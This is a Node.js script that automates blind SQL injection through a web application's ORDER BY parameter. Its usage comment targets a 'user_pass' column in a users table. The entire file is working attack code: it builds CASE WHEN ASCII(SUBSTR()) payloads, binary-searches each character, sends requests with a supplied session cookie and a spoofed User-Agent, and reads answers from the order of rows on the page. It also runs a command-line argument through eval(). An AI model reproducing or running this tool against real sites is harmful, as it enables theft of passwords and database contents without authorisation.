// automating sql injection in ORDERBY clauses by using ASCII()== as a boolean test
// usage: node bust.js vulnerableStatement targetFieldSelectStatement estimatedLength knownSortableColumn javascriptOrderTest cookies
// e.g.: node bust.js "http://vulnerable.com/admin.php?page=exploitable&&OrderBy=" "SELECT user_pass FROM users WHERE ID = 1" 40 "ID" "html.lastIndexOf(\"[data id='1']\") < html.lastIndexOf(\"[data id='2']\")" "admincookie=blahblah;"

var request = require('request');

var parameters = {
    vulnerableURL: process.argv[2],
    targetFieldSelector: process.argv[3],
    estimatedLength: parseInt(process.argv[4]),
    knownColumnName: process.argv[5],
    orderTest: process.argv[6],
    cookie: process.argv[7]
};

function areIDsInAscendingOrder(html)
{
    // 'html' is available to orderTest
    return eval(parameters.orderTest);
}

function extract() {
    var extractedCharacters = [];
    var finishedTests = 0;

    var printFinalResult = function () {
        console.log("Extracted result for query '" + parameters.targetFieldSelector + "': " + extractedCharacters.join('') + " (attempted length: " + parameters.estimatedLength + ")");
        if(extractedCharacters.indexOf('þ') !== -1) {
            console.error('The appearance of þ in the extracted string may mean the field you are attempting to print does not exist.');
        }
    };

    for(var i = 1; i <= parameters.estimatedLength; i++) {
        var printResult = function(answer) {
            extractedCharacters[this] = String.fromCharCode(answer);
            console.log('Char at position ' + this + ' is ' + extractedCharacters[this]);
            finishedTests++;
            if(finishedTests == parameters.estimatedLength) {
                printFinalResult();
            }
        };

        var est = new Estimator(i, printResult.bind(i));
        est.attempt(est.attempt);
    }
}

var Estimator = function (_index, _cb) {
    var midpoint, max = 255, min = 0;
    var successCallback = _cb;
    var index = _index;
    var testFunc = function(a, cb) {
        var callback = cb;
        var injectedString = '(CASE WHEN(ASCII(SUBSTR((' + parameters.targetFieldSelector + '), ' + index + ')) > ' + a + ') THEN ' + parameters.knownColumnName + ' END) ASC,'
            + '(CASE WHEN(ASCII(SUBSTR((' + parameters.targetFieldSelector + '), ' + index + ')) < ' + a + ') THEN ' + parameters.knownColumnName + ' END) DESC';

        request({
            url: parameters.vulnerableURL + injectedString,
            headers: {
                'Cookie': parameters.cookie,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36'
            }
        }, function (error, response, body) {
            if (error) throw error;
            callback(areIDsInAscendingOrder(body));
        });
    };

    var firstTest = function(result) {
        if(result == true) {
            min = midpoint;
        } else {
            max = midpoint;
        }

        if(min == max) {
            successCallback(min);
        } else {
            attempt();
        }
    };

    var finalTest = function(result) {
        if(result == true) {
            max = min;
        } else {
            min = max;
        }

        if(min == max) {
            successCallback(min);
        } else {
            attempt();
        }
    };

    var attempt = function() {
        if(min == max - 1) {
            testFunc(min, finalTest);
        } else {
            midpoint = Math.floor((min + max) / 2);
            testFunc(midpoint, firstTest);
        }
    };

    return {
        attempt: attempt
    }
};

extract();